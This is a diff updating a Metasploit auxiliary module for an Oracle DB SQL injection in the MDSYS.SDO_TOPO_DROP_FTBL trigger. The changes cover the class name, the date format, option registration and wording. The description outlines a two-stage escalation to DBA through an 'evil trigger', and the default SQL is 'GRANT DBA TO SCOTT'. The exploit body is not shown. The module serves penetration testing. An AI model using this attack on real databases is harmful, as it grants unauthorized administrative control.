@@ -1,19 +1,16 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::FILEFORMAT
 
   def initialize(info = {})
     super(update_info(info,
       'Name'           => 'Oracle DB SQL Injection in MDSYS.SDO_TOPO_DROP_FTBL Trigger',
       'Description'    => %q{
-          This module will escalate a Oracle DB user to MDSYS by exploiting an sql injection bug in
+          This module will escalate an Oracle DB user to MDSYS by exploiting a sql injection bug in
           the MDSYS.SDO_TOPO_DROP_FTBL trigger. After that exploit escalate user to DBA using "CREATE ANY TRIGGER" privilege
           given to MDSYS user by creating evil trigger in system scheme (2-stage attack).
       },
@@ -26,16 +23,14 @@ class Metasploit3 < Msf::Auxiliary
           [ 'URL', 'http://www.securityfocus.com/archive/1/500061' ],
           [ 'URL', 'http://www.ngssoftware.com/' ],
         ],
-      'DisclosureDate' => 'Jan 13 2009'))
+      'DisclosureDate' => '2009-01-13'))
 
       register_options(
         [
           OptString.new('SQL',      [ false, 'The SQL to execute.',  'GRANT DBA TO SCOTT']),
           OptString.new('USER',      [ false, 'The current user. ',  'SCOTT']),
-          OptString.new('FILENAME', [ false, 'The file name.',  'msf.sql']),
-          OptString.new('OUTPUTPATH', [ false, 'The location of the file.',  './data/exploits/']),
-
-        ], self.class)
+          OptString.new('FILENAME', [ false, 'The file name.',  'msf.sql'])
+        ])
   end
 
   def run
@@ -114,5 +109,4 @@ class Metasploit3 < Msf::Auxiliary
 
 
   end
-
 end
